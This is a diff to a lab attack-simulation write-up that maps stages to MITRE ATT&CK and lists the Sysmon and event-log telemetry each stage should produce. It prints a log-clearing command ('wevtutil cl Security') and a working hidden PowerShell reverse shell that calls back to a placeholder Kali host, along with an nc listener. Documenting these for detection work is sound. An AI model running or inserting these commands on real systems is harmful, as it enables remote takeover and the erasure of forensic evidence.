@@ -185,7 +185,7 @@ The attacker attempts to impair system defenses by **removing forensic evidence*
 
 ---
 
-### 💻 Command Executed
+### Command Executed
 
 ```powershell
 wevtutil cl Security
@@ -193,13 +193,13 @@ wevtutil cl Security
 
 ---
 
-### 🎯 Objective
+### Objective
 
 To **erase the Security Event Log**, removing records of authentication events, privilege use, and other critical activities—thereby reducing the defender’s visibility into attacker actions.
 
 ---
 
-### 🧠 MITRE ATT&CK Mapping
+### MITRE ATT&CK Mapping
 
 * **Technique:** T1562 – Impair Defenses
 * **Sub-technique:** T1562.002 – Disable Windows Event Logging *(closest related)*
@@ -207,7 +207,7 @@ To **erase the Security Event Log**, removing records of authentication events, 
 
 ---
 
-### 📡 Expected Telemetry
+### Expected Telemetry
 
 #### **Event Source: Windows Event Logs / PowerShell**
 
@@ -227,7 +227,7 @@ To **erase the Security Event Log**, removing records of authentication events, 
 
 ---
 
-### 🔍 Sysmon Telemetry
+### Sysmon Telemetry
 
 * **Event ID 1 (Process Creation)**
 
@@ -245,15 +245,87 @@ To **erase the Security Event Log**, removing records of authentication events, 
 
 # Stage 5 – Command and Control
 
-The attacker establishes a reverse shell connection.
+The attacker establishes a **covert reverse-shell connection** from the compromised Windows host via PowerShell, enabling remote command execution without relying on external binaries such as Netcat.
 
-```text
+---
+
+## Commands Executed
+
+### Attacker (Kali Listener)
+
+```bash
 nc -lvnp 4444
 ```
 
-MITRE Technique: T1071 – Command and Control
+### Victim (Windows PowerShell Reverse Shell)
 
-### Reverse Shell Screenshot
+```powershell
+powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('<KALI_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+---
+
+## Objective
+
+To establish a **stealthy bidirectional command channel (C2)** between the attacker and victim system using native Windows tooling, enabling persistent remote control.
+
+---
+
+## MITRE ATT&CK Mapping
+
+* **Technique:** T1071 – Application Layer Protocol
+* **Sub-technique:** T1071.001 – Web Protocols *(if adapted to HTTP/HTTPS)*
+* **Also Relevant:**
+
+  * T1059.001 – PowerShell
+  * T1105 – Ingress Tool Transfer
+
+---
+
+## Expected Telemetry
+
+### 🔹 Sysmon Logs
+
+#### ✅ Event ID 1 – Process Creation
+
+* Image: `powershell.exe`
+* CommandLine contains:
+
+  * `-nop`
+  * `-w hidden`
+  * `TCPClient`
+
+---
+
+#### ✅ Event ID 3 – Network Connection
+
+* Image: `powershell.exe`
+* Destination IP: `<KALI_IP>`
+* Destination Port: `4444`
+
+Strong indicator of reverse shell / C2 traffic
+
+---
+
+### 🔹 PowerShell Logs
+
+#### ✅ Event ID 4104 – Script Block Logging
+
+Key indicators:
+
+* `System.Net.Sockets.TCPClient`
+* `iex` (Invoke-Expression)
+
+---
+
+### 🔹 Windows Security Logs
+
+#### ✅ Event ID 4688 – Process Creation
+
+* New Process: `powershell.exe`
+
+---
+
 
 ![Reverse Shell](screenshots/reverse-shell.png)
 *(Insert screenshot showing attacker shell session)*
